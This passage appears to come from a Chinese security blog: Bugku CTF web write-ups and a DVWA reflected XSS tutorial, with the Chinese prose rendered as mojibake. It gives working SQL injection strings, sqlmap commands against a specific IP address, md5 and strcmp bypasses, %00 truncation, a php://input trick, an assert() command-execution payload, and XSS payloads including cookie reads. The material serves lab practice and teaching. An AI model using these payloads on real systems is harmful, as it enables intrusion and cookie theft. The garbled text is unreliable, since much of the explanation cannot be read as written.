æƒ¯ï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹è¿™ä¸ª.bakæ‹“å±•åæ–‡ä»¶åº”è¯¥æœ‰ä¸œè¥¿ ä¸‹è½½æ–‡ä»¶å¹¶æ‰“å¼€ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°key1å’Œkey2æœ¬èº«ä¸èƒ½ç›¸ç­‰ï¼Œä½†æ˜¯è¢«md5ç¼–ç åä¸¤è€…è¦ç›¸ç­‰æ‰èƒ½å¾—åˆ°flagã€‚ æ€»çš„æ¥è¯´è¿™æ˜¯ä¸€é“æ–‡ä»¶åŒ…å«æ¼æ´+ç»•è¿‡å­—ç¬¦ä¸²è¿‡æ»¤+ç»•è¿‡md5ç¼–ç çš„é¢˜ æˆ‘ä»¬ç”¨åŒå†™ç»•è¿‡å­—ç¬¦ä¸²è¿‡æ»¤ï¼Œåˆ©ç”¨md5()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼ˆå¦‚æœä¼ å…¥çš„ä¸ºæ•°ç»„ï¼Œä¼šè¿”å›NULLï¼Œæ‰€ä»¥ä¸¤ä¸ªæ•°ç»„ç»è¿‡åŠ å¯†åå¾—åˆ°çš„éƒ½æ˜¯NULL,ä¹Ÿå°±æ˜¯ç›¸ç­‰çš„ã€‚ï¼‰è¾¾æˆifæ¡ä»¶ã€‚ å› æ­¤æˆ‘ä»¬çš„payloadæ˜¯?kekeyy1[]=1&amp;kekeyy2[]=2 web17:(sqlæ³¨å…¥â€”â€”postå‹)1.æ‰‹å·¥æ³¨å…¥ï¼šæŸ¥æ•°å­—æ®µå€¼ï¼š0â€™ union select 1,2,3,4# çˆ†åº“ï¼š0â€™ union select 1,2,3,database()# çˆ†è¡¨ï¼š0â€™ union select 1,2,3,group_concat(table_name) from information_schema.talbes where table_schema=â€™skctfâ€™# çˆ†åˆ—ï¼š0â€™ union select 1,2,3,group_concat(column_name) from information_schema.tables where table_name=fl4g# çˆ†å€¼ï¼š0â€™ union select 1,2,3,skctf_flag form fl4g# 2.sqlmapçˆ†åº“ï¼šsqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; --current-db çˆ†è¡¨ï¼šsqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; -D skctf --tables çˆ†åˆ—ï¼šsqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; -D skctf -T fl4g --columns çˆ†å€¼ï¼šsqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; -D skctf -T fl4g -C skctf_flag --dump Web20ï¼ˆlineæ§åˆ¶è¿”å›å†…å®¹ï¼‰æ‰“å¼€é¢˜ç›®åœ°å€å‘ç°æ˜¯ä¸€å †ä¹±ç ï¼Œæˆ‘è¿˜ä»¥ä¸ºä¹±ç é‡Œé¢æœ‰å†…å®¹ï¼Œåˆ†æäº†ä¸€é€šï¼Œç»“æœä»€ä¹ˆä¹Ÿæ²¡æœ‰ã€‚ æ³¨æ„åˆ°urlæ filenameçš„å€¼å¥½åƒè¢«ç¼–ç äº†ï¼Œbase64è§£ç å¾—keys.txtã€‚ å˜é‡lineçš„å€¼ä¸ºå¤šå°‘å°±è¿”å›æŒ‡å®šæ–‡ä»¶ä¸­ç¬¬å‡ è¡Œï¼Œæ— å€¼æ—¶é»˜è®¤è¿”å›ç¬¬0è¡Œ ä¸€èˆ¬index.phpéƒ½ä¼šå­˜åœ¨æºç ï¼Œç¼–ç index.php è¿”å›index.phpç¬¬ä¸€è¡Œæºç ï¼Œåªè¦ä¸æ–­æ›´æ”¹lineçš„å€¼æœ€ç»ˆå°±å¯ä»¥è·å¾—å®Œæ•´çš„index.phpæºç ï¼ˆå› ä¸ºæˆ‘ä¸ä¼šå†™pythonè„šæœ¬ï¼‰ index.phpæºç ï¼š 12345678910111213141516171819&lt;?php error_reporting(0);$file=base64_decode(isset($_GET[&#x27;filename&#x27;])?$_GET[&#x27;filename&#x27;]:&quot;&quot;);$line=isset($_GET[&#x27;line&#x27;])?intval($_GET[&#x27;line&#x27;]):0;if($file==&#x27;&#x27;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;);$file_list = array(&#x27;0&#x27; =&gt;&#x27;keys.txt&#x27;,&#x27;1&#x27; =&gt;&#x27;index.php&#x27;,);if(isset($_COOKIE[&#x27;margin&#x27;]) &amp;&amp; $_COOKIE[&#x27;margin&#x27;]==&#x27;margin&#x27;)&#123;$file_list[2]=&#x27;keys.php&#x27;;&#125;if(in_array($file, $file_list))&#123;$fa = file($file);echo $fa[$line];&#125;?&gt; æˆ‘ä»¬çœ‹åˆ°å½“cookieå†…å®¹ä¸ºå‚æ•°margin=marginæ—¶ï¼Œfile_listæ•°ç»„ä¼šå¤šä¸€ä¸ªé”®å€¼keys.phpï¼Œç„¶åé€šè¿‡in_arrayå‡½æ•°æ£€æµ‹æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åæ˜¯å¦åœ¨file_listæ•°ç»„ä¸­ï¼Œæ˜¯åˆ™å‘é€key.phpæ–‡ä»¶çš„å†…å®¹ã€‚ å› æ­¤æˆ‘ä»¬æ„é€ cookieï¼šmargin=marginï¼Œä»¤filenameçš„å€¼ä¸ºkey.php base64ç¼–ç åçš„å€¼ã€‚ web21ï¼šï¼ˆç¼–ç +åŠ æ¡ä»¶ç»•è¿‡ï¼‰æ‰“å¼€é¢˜ç›®åœ°å€åšçš„ç¬¬ä¸€ä»¶å°±æ˜¯æŸ¥çœ‹ç½‘é¡µæºç  å‘ç°æœ‰ä¸€ä¸ª1p.htmlæ–‡ä»¶ï¼Œæ‰“å¼€æ˜¯ä¸€æ®µHTMLä»£ç  1234567891011121314151617181920&lt;HTML&gt;&lt;HEAD&gt;&lt;SCRIPT LANGUAGE=&quot;Javascript&quot;&gt;&lt;!--var Words =&quot;%3Cscript%3Ewindow.location.href%3D&#x27;http%3A%2F%2Fwww.bugku.com&#x27;%3B%3C%2Fscript%3E%20%0A%3C!--JTIyJTNCaWYoISUyNF9HRVQlNUInaWQnJTVEKSUwQSU3QiUwQSUwOWhlYWRlcignTG9jYXRpb24lM0ElMjBoZWxsby5waHAlM0ZpZCUzRDEnKSUzQiUwQSUwOWV4aXQoKSUzQiUwQSU3RCUwQSUyNGlkJTNEJTI0X0dFVCU1QidpZCclNUQlM0IlMEElMjRhJTNEJTI0X0dFVCU1QidhJyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJ2InJTVEJTNCJTBBaWYoc3RyaXBvcyglMjRhJTJDJy4nKSklMEElN0IlMEElMDllY2hvJTIwJ25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJyUzQiUwQSUwOXJldHVybiUyMCUzQiUwQSU3RCUwQSUyNGRhdGElMjAlM0QlMjAlNDBmaWxlX2dldF9jb250ZW50cyglMjRhJTJDJ3InKSUzQiUwQWlmKCUyNGRhdGElM0QlM0QlMjJidWdrdSUyMGlzJTIwYSUyMG5pY2UlMjBwbGF0ZWZvcm0hJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuKCUyNGIpJTNFNSUyMGFuZCUyMGVyZWdpKCUyMjExMSUyMi5zdWJzdHIoJTI0YiUyQzAlMkMxKSUyQyUyMjExMTQlMjIpJTIwYW5kJTIwc3Vic3RyKCUyNGIlMkMwJTJDMSkhJTNENCklMEElN0IlMEElMDklMjRmbGFnJTIwJTNEJTIwJTIyZmxhZyU3QioqKioqKioqKioqJTdEJTIyJTBBJTdEJTBBZWxzZSUwQSU3QiUwQSUwOXByaW50JTIwJTIybmV2ZXIlMjBuZXZlciUyMG5ldmVyJTIwZ2l2ZSUyMHVwJTIwISEhJTIyJTNCJTBBJTdEJTBBJTBBJTBBJTNGJTNF--%3E&quot; function OutWord()&#123;var NewWords;NewWords = unescape(Words);document.write(NewWords);&#125; OutWord();// --&gt;&lt;/SCRIPT&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;/BODY&gt;&lt;/HTML&gt; æˆ‘ä»¬çœ‹åˆ°wordä¸€å¤§ä¸²å­—ç¬¦ä¸²å¾ˆå¯ç–‘ï¼Œç»“åˆåé¢çš„unescape()å‡½æ•°ï¼Œæ–­å®šè¿™é‡Œè¢«ç¼–ç äº† ç”¨burpè§£ç ï¼Œé¡ºåºä¸ºï¼šurlè§£ç ï¼Œbase64è§£ç ï¼Œå†urlè§£ç  æœ€ç»ˆå¾— 12345678910111213141516171819202122232425&lt;!--&quot;;if(!$_GET[&#x27;id&#x27;])&#123; header(&#x27;Location: hello.php?id=1&#x27;); exit();&#125;$id=$_GET[&#x27;id&#x27;];$a=$_GET[&#x27;a&#x27;];$b=$_GET[&#x27;b&#x27;];if(stripos($a,&#x27;.&#x27;))&#123; echo &#x27;no no no no no no no&#x27;; return ;&#125;$data = @file_get_contents($a,&#x27;r&#x27;);if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)&#123; $flag = &quot;flag&#123;***********&#125;&quot;&#125;else&#123; print &quot;never never never give up !!!&quot;;&#125;?&gt;--&gt; file_get_contents() å‡½æ•°ï¼šæŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚ eregi() ä½œç”¨ï¼šä¸åˆ†å¤§å°å†™çš„æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…â€”â€”åœ¨ string ä¸­å¯»æ‰¾ä¸ç»™å®šçš„æ­£åˆ™è¡¨è¾¾å¼ pattern æ‰€åŒ¹é…çš„å­ä¸²ã€‚ è¯­æ³•ï¼šereg ( string $pattern , string $string , array &amp;$regs = ? ) ä»£ç å®¡è®¡ï¼šå½“idä¸ºç©ºæ—¶ï¼Œç½‘é¡µè‡ªåŠ¨è·³è½¬åˆ°æŒ‡å®šæ–‡ä»¶ï¼›å‚æ•°aä¸­ä¸å¾—æœ‰.ï¼Œå¦åˆ™è¾“å‡ºâ€˜noâ€™ï¼ˆè¿™é™åˆ¶äº†æˆ‘ä»¬ç›´æ¥å¯¼å…¥æ–‡ä»¶ï¼‰ï¼›æ¥ç€å°†açš„å€¼èµ‹å€¼ç»™å‚æ•°dataï¼›ifæ¡ä»¶è§„å®šï¼šdataçš„å€¼ä¸ºbugku is a nice plateform!ï¼Œidçš„å€¼ä¸º0ï¼Œbå€¼çš„é•¿åº¦å¤§äº5ï¼Œç„¶å111å’Œbå€¼çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ç»“åˆä¸1114è¿›è¡ŒåŒ¹é…ï¼Œå¹¶ä¸”bå€¼çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸èƒ½æ˜¯4ã€‚ eregå’Œeregiçš„æˆªæ–­æ¼æ´ï¼š%00æˆªæ–­åŠé‡åˆ°%00åˆ™é»˜è®¤ä¸ºå­—ç¬¦ä¸²çš„ç»“æŸã€‚å› æ­¤æˆ‘ä»¬æ„é€ b=%0023456 phpä¸­ä¼šæŠŠid=0å½“æˆid=nothingï¼Œä¹Ÿå°±æ˜¯ç©ºç™½ã€‚é‚£ä¹ˆè¿™é¢˜!$_GET[&#39;id&#39;]å’Œ$id==0æ˜æ˜¾å†²çªçŸ›ç›¾ï¼Œè¿™æ—¶æˆ‘ä»¬è¦æƒ³åˆ°PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ ï¼š?id=0e1 ç”±äºifæ¡ä»¶è§„å®šï¼šdataçš„å€¼ä¸ºbugku is a nice plateform!å› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨php://inputè·å–postä¸Šä¼ æ•°æ®çš„ç‰¹ç‚¹ï¼Œ ä»¤?a=php://inputå¹¶postæ•°æ®bugku is a nice plateform! ç»¼ä¸Šæ‰€è¿°ï¼špayload=?id=0e1&amp;a=php://input&amp;b=%0023456 å¹¶postæ•°æ®bugku is a nice plateform! web22ï¼ˆassert()å‡½æ•°æ¼æ´åˆ©ç”¨ï¼‰ç‚¹å¼€é¢˜ç›®å‘ç°é¢˜ç›®æè¿°é‚£æ®µè¯ï¼š 1234$poc&#x3D;&quot;a#s#s#e#r#t&quot;; $poc_1&#x3D;explode(&quot;#&quot;,$poc); $poc_2&#x3D;$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[&#39;s&#39;]) ä»¥ä¸Šä»£ç æœ€ç»ˆç­‰ä»·æ‰§è¡Œè¯­å¥ï¼šassert($_GET[&#39;s&#39;]) è¡¥å……ï¼šassert()å‡½æ•°ä¼šå°†æ‹¬å·å†…çš„å­—ç¬¦ä¸²å½“ä½œphpä»£ç æ‰§è¡Œã€‚ è¯¦æƒ…å‚è€ƒï¼šhttps://www.smi1e.top/%E6%B5%85%E8%B0%88eval%E5%92%8Cassert/ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ ¹æ®assert()å‡½æ•°çš„ç‰¹æ€§ï¼Œæ„é€ payloadï¼š?s=system(ls)æˆ–?s=system(dir) è®¿é—®flaga15808abee46a1d5.txtï¼Œå¾—flag web23ï¼šï¼ˆæ­£åˆ™è¡¨è¾¾å¼ï¼‰æ‰“å¼€é¢˜ç›®åœ°å€ï¼š æˆ‘ä»¬çœ‹åˆ°ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼š/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/iï¼Œå½“æˆ‘ä»¬è¾“å…¥çš„idå€¼æ»¡è¶³æ­£åˆ™åŒ¹é…æ˜¯ä¼šè¾“å‡ºflag æˆ‘ä»¬å¯ä»¥æŠŠè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ‹†åˆ†æˆï¼škey . * key .&#123;4,7&#125; key : / . / . * key [a-z] [[:punct:]] åˆ†æï¼ˆä»å·¦åˆ°å³ï¼‰ï¼š keyâ€”â€”å°±æ˜¯key . â€”â€”ä»»æ„å­—ç¬¦ *â€”â€”åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ keyâ€”â€”å°±æ˜¯key .&#123;4,7&#125;â€”â€”åŒ¹é…ä»»æ„å­—ç¬¦4åˆ°7æ¬¡ keyâ€”â€”å°±æ˜¯key :â€”â€”å°±æ˜¯: /â€”â€”å°±æ˜¯/ . â€”â€”ä»»æ„å­—ç¬¦ /â€”â€”å°±æ˜¯/ . â€”â€”ä»»æ„å­—ç¬¦ *â€”â€”åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ keyâ€”â€”å°±æ˜¯key [a-z]â€”â€”åŒ¹é…a-zä¹‹é—´çš„å­—æ¯ [[:punct:]]â€”â€”åŒ¹é…ä»»æ„æ ‡ç‚¹ç¬¦å· ä¾æ¬¡æˆ‘ä»¬æ„é€ payloadï¼Œä»¥getçš„æ–¹å¼ä¼ å‚idï¼š?id=key1key1111key:/1/1keya! ï¼ˆpayloadä¸å”¯ä¸€ï¼‰ web24ï¼šï¼ˆmd5ç»•è¿‡+strcmpå‡½æ•°ç»•è¿‡ï¼‰æ‰“å¼€é¢˜ç›®åœ°å€ï¼ŒæŸ¥çœ‹æºç ï¼š ç‚¹å¼€code.txt æˆ‘ä»¬çœ‹åˆ°æœ‰ä¸‰ä¸ªå‚æ•°ï¼šv1,v2,v3 è¦æ»¡è¶³æ¡ä»¶ï¼š 1.v1!=v2 2.md5(v1)=mad5(v2) 3.v3çš„å€¼ç­‰äºflag ç»•æ¡ä»¶1,2 æ³•1ï¼šé€šè¿‡æ•°ç»„ç»•è¿‡md5å‡½æ•°åŠ å¯†ï¼Œå¦‚v1[]=1,v2[]=2 æ³•2ï¼šåˆ©ç”¨phpå¼±å£ä»¤ç‰¹æ€§ï¼Œä¼šå°†0eå¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£æä¸º0ã€‚å¸¸è§çš„md5åŠ å¯†åä»¥0eå¼€å¤´çš„å­—ç¬¦ä¸²ï¼š240610708ã€QNKCDZOã€aabg7XSsã€aabC9RqSç­‰ ç»•è¿‡æ¡ä»¶3 åˆ©ç”¨strcmpå‡½æ•°ä¸èƒ½æ¯”è¾ƒæ•°ç»„ï¼ˆæ¯”è¾ƒæ•°ç»„è¿”å›ä¸ºç©ºï¼ŒåŠé›¶ï¼‰ï¼Œæ„é€ v3[]=flag ç»¼ä¸Šï¼Œæ„é€ flagï¼š?v1[]=1&amp;v2[]=2&amp;v3[]=flagæˆ–?v1=240610708&amp;v2=QNKCDZO&amp;v3[]=flag","tags":[{"name":"åˆ·é¢˜","slug":"åˆ·é¢˜","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"DVWAâ€”XSS","date":"2021-03-13T02:35:57.000Z","path":"2021/03/13/DVWAâ€”XSS/","text":"å‰è¨€ï¼šâ€”ï¼‰XSSçš„ä¸­æ–‡åç§°å«è·¨ç«™è„šæœ¬ï¼Œæ˜¯WEBæ¼æ´ä¸­æ¯”è¾ƒå¸¸è§çš„ä¸€ç§ï¼Œç‰¹ç‚¹å°±æ˜¯å¯ä»¥å°†æ¶æ„HTML/JavaScriptä»£ç æ³¨å…¥åˆ°å—å®³ç”¨æˆ·æµè§ˆçš„ç½‘é¡µä¸Šï¼Œä»è€Œè¾¾åˆ°åŠ«æŒç”¨æˆ·ä¼šè¯çš„ç›®çš„ã€‚å®é™…åº”ç”¨ä¸­xsså¯ä»¥å®Œæˆå¾ˆå¤šæ“ä½œï¼Œè¿™é‡Œä¸¾ä¸¤ä¸ªä¾‹å­ã€‚ çªƒå–ç½‘é¡µæµè§ˆä¸­çš„cookieå€¼ åœ¨ç½‘é¡µæµè§ˆä¸­æˆ‘ä»¬å¸¸å¸¸æ¶‰åŠåˆ°ç”¨æˆ·ç™»å½•ï¼Œç™»å½•å®Œæ¯•ä¹‹åæœåŠ¡ç«¯ä¼šè¿”å›ä¸€ä¸ªcookieå€¼ã€‚è¿™ä¸ªcookieå€¼ç›¸å½“äºä¸€ä¸ªä»¤ç‰Œï¼Œæ‹¿ç€è¿™å¼ ä»¤ç‰Œå°±ç­‰åŒäºè¯æ˜äº†ä½ æ˜¯æŸä¸ªç”¨æˆ·ã€‚ å¦‚æœä½ çš„cookieå€¼è¢«çªƒå–ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¾ˆå¯èƒ½èƒ½å¤Ÿç›´æ¥åˆ©ç”¨ä½ çš„è¿™å¼ ä»¤ç‰Œä¸ç”¨å¯†ç å°±ç™»å½•ä½ çš„è´¦æˆ·ã€‚å¦‚æœæƒ³è¦é€šè¿‡scriptè„šæœ¬è·å¾—å½“å‰é¡µé¢çš„cookieå€¼ï¼Œé€šå¸¸ä¼šç”¨åˆ°document.cookieã€‚ è¯•æƒ³ä¸‹å¦‚æœåƒç©ºé—´è¯´è¯´ä¸­èƒ½å¤Ÿå†™å…¥xssæ”»å‡»è¯­å¥ï¼Œé‚£å²‚ä¸æ˜¯çœ‹äº†ä½ è¯´è¯´çš„äººçš„å·ä½ éƒ½å¯ä»¥ç™»å½•ï¼ˆä¸è¿‡æŸäº›å‚å•†çš„cookieæœ‰å…¶ä»–éªŒè¯æªæ–½å¦‚ï¼šHttp-Onlyä¿è¯åŒä¸€cookieä¸èƒ½è¢«æ»¥ç”¨ï¼‰ åŠ«æŒæµé‡å®ç°æ¶æ„è·³è½¬ è¿™ä¸ªå¾ˆç®€å•ï¼Œå°±æ˜¯åœ¨ç½‘é¡µä¸­æƒ³åŠæ³•æ’å…¥ä¸€å¥åƒè¿™æ ·çš„è¯­å¥ï¼š 1&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;;&lt;/script&gt; é‚£ä¹ˆæ‰€è®¿é—®çš„ç½‘ç«™å°±ä¼šè¢«è·³è½¬åˆ°ç™¾åº¦çš„é¦–é¡µã€‚ã€æ‘˜è‡ªhttps://zhuanlan.zhihu.com/p/26177815ã€‘ â€”ï¼‰XSSæ ¹æ®æ¶æ„è„šæœ¬çš„ä¼ é€’æ–¹å¼å¯ä»¥åˆ†ä¸º3ç§ï¼Œåˆ†åˆ«ä¸ºåå°„å‹ã€å­˜å‚¨å‹ã€DOMå‹ï¼Œå‰é¢ä¸¤ç§æ¶æ„è„šæœ¬éƒ½ä¼šç»è¿‡æœåŠ¡å™¨ç«¯ç„¶åè¿”å›ç»™å®¢æˆ·ç«¯ï¼Œç›¸å¯¹DOMå‹æ¥è¯´æ¯”è¾ƒå¥½æ£€æµ‹ä¸é˜²å¾¡ï¼Œè€ŒDOMå‹ä¸ç”¨å°†æ¶æ„è„šæœ¬ä¼ è¾“åˆ°æœåŠ¡å™¨åœ¨è¿”å›å®¢æˆ·ç«¯ã€‚ DOM-based XSSï¼šæ¼æ´æ˜¯åŸºäºæ–‡æ¡£å¯¹è±¡æ¨¡å‹Document Objeet Modelï¼ŒDOM)çš„ä¸€ç§æ¼æ´ã€‚DOMæ˜¯ä¸€ä¸ªä¸å¹³å°ã€ç¼–ç¨‹è¯­è¨€æ— å…³çš„æ¥å£ï¼Œå®ƒå…è®¸ç¨‹åºæˆ–è„šæœ¬åŠ¨æ€åœ°è®¿é—®å’Œæ›´æ–°æ–‡æ¡£å†…å®¹ã€ç»“æ„å’Œæ ·å¼ï¼Œå¤„ç†åçš„ç»“æœèƒ½å¤Ÿæˆä¸ºæ˜¾ç¤ºé¡µé¢çš„ä¸€éƒ¨åˆ†ã€‚DOMä¸­æœ‰å¾ˆå¤šå¯¹è±¡ï¼Œå…¶ä¸­ä¸€äº›æ˜¯ç”¨æˆ·å¯ä»¥æ“çºµçš„ï¼Œå¦‚urlï¼Œlocationï¼Œrefererç­‰ã€‚å®¢æˆ·ç«¯çš„è„šæœ¬ç¨‹åºå¯ä»¥é€šè¿‡DOMåŠ¨æ€åœ°æ£€æŸ¥å’Œä¿®æ”¹é¡µé¢å†…å®¹ï¼Œå®ƒä¸ä¾èµ–äºæäº¤æ•°æ®åˆ°æœåŠ¡å™¨ç«¯ï¼Œè€Œä»å®¢æˆ·ç«¯è·å¾—DOMä¸­çš„æ•°æ®åœ¨æœ¬åœ°æ‰§è¡Œï¼Œå¦‚æœDOMä¸­çš„æ•°æ®æ²¡æœ‰ç»è¿‡ä¸¥æ ¼ç¡®è®¤ï¼Œå°±ä¼šäº§ç”ŸDOM-based XSSæ¼æ´ã€‚ åå°„å‹XSSï¼š&lt;éæŒä¹…åŒ–&gt; æ”»å‡»è€…äº‹å…ˆåˆ¶ä½œå¥½æ”»å‡»é“¾æ¥, éœ€è¦æ¬ºéª—ç”¨æˆ·è‡ªå·±å»ç‚¹å‡»é“¾æ¥æ‰èƒ½è§¦å‘XSSä»£ç ï¼ˆæœåŠ¡å™¨ä¸­æ²¡æœ‰è¿™æ ·çš„é¡µé¢å’Œå†…å®¹ï¼‰ï¼Œä¸€èˆ¬å®¹æ˜“å‡ºç°åœ¨æœç´¢é¡µé¢ã€‚ å­˜å‚¨å‹XSSï¼š&lt;æŒä¹…åŒ–&gt; ä»£ç æ˜¯å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸­çš„ï¼Œå¦‚åœ¨ä¸ªäººä¿¡æ¯æˆ–å‘è¡¨æ–‡ç« ç­‰åœ°æ–¹ï¼ŒåŠ å…¥ä»£ç ï¼Œå¦‚æœæ²¡æœ‰è¿‡æ»¤æˆ–è¿‡æ»¤ä¸ä¸¥ï¼Œé‚£ä¹ˆè¿™äº›ä»£ç å°†å‚¨å­˜åˆ°æœåŠ¡å™¨ä¸­ï¼Œæ¯å½“æœ‰ç”¨æˆ·è®¿é—®è¯¥é¡µé¢çš„æ—¶å€™éƒ½ä¼šè§¦å‘ä»£ç æ‰§è¡Œï¼Œè¿™ç§XSSéå¸¸å±é™©ï¼Œå®¹æ˜“é€ æˆè •è™«ï¼Œå¤§é‡ç›—çªƒcookieï¼ˆè™½ç„¶è¿˜æœ‰ç§DOMå‹XSSï¼Œä½†æ˜¯ä¹Ÿè¿˜æ˜¯åŒ…æ‹¬åœ¨å­˜å‚¨å‹XSSå†…ï¼‰ã€‚ ä½œè€…ï¼šJewel591 é“¾æ¥ï¼šhttps://www.jianshu.com/p/4fcb4b411a66 æ¥æºï¼šç®€ä¹¦ è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚ ReflectedLowï¼šæŸ¥çœ‹æºç ï¼š 1234567891011&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;&#125;?&gt; æ–°å‡½æ•° array_key_exists()å‡½æ•° åŠŸèƒ½ï¼šæ£€æŸ¥æŸä¸ªæ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„é”®åï¼Œå¦‚æœé”®åå­˜åœ¨åˆ™è¿”å› trueï¼Œå¦‚æœé”®åä¸å­˜åœ¨åˆ™è¿”å› falseã€‚ è¯­æ³•ï¼šarray_key_exists(key,array) å‚æ•° æè¿° key å¿…éœ€ã€‚è§„å®šé”®åã€‚ array å¿…éœ€ã€‚è§„å®šæ•°ç»„ã€‚ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯¹æˆ‘ä»¬è¾“å…¥çš„æ•°æ®æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œåœ¨æ¡†å†…è¾“å…¥&lt;script&gt;alert(1);&lt;/script&gt; ç›´æ¥è·å–ç”¨æˆ·çš„cookieï¼š&lt;script&gt;alert(document.cookie)&lt;/script&gt; Mediumï¼šæŸ¥çœ‹æºç ï¼š 1234567891011121314&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt; æˆ‘ä»¬çœ‹åˆ°æœåŠ¡å™¨å¯¹&lt;script&gt;è¿›è¡Œäº†è¿‡æ»¤å¤„ç†ï¼Œä½†æ˜¯æˆ‘ä»¬åŒå†™ç»•è¿‡å°±å¥½äº†ï¼š&lt;script&lt;script&gt;&gt;alert(1);&lt;/script&gt; æˆ–è€…å¤§å°å†™ç»•è¿‡ï¼š&lt;Script&gt;alert(1);&lt;/script&gt; Highï¼š1234567891011121314&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123; // Get input $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); // Feedback for end user echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;&#125;?&gt; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨ä½¿ç”¨äº†æ­£åˆ™è¡¨è¾¾å¼ç¦ç”¨äº†æ ‡ç­¾ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡imgã€bodyç­‰æ ‡ç­¾çš„äº‹ä»¶æˆ–è€…iframeç­‰æ ‡ç­¾çš„srcæ³¨å…¥æ¶æ„çš„jsä»£ç ã€‚å¸¸ç”¨çš„HTMLæ ‡ç­¾äº‹ä»¶è¿˜æœ‰onerror,oneclick,onmouseover,onloadç­‰ï¼Œ æ ¼å¼å¦‚ä¸‹ï¼šonerror/onclick/onmouseover/onload=â€œæ‰§è¡Œå†…å®¹â€ 1ï¼‰&lt;img src=&quot;&quot; onerror=alert(&#39;1&#39;)&gt; src å±æ€§è§„å®šå¤–éƒ¨è„šæœ¬æ–‡ä»¶çš„ URLã€‚ onerror äº‹ä»¶åœ¨è§†é¢‘/éŸ³é¢‘ï¼ˆaudio/videoï¼‰æ•°æ®åŠ è½½æœŸé—´å‘ç”Ÿé”™è¯¯æ—¶è§¦å‘ã€‚ è¿™å¥è¯çš„æ„æ€æ˜¯å½“åŠ 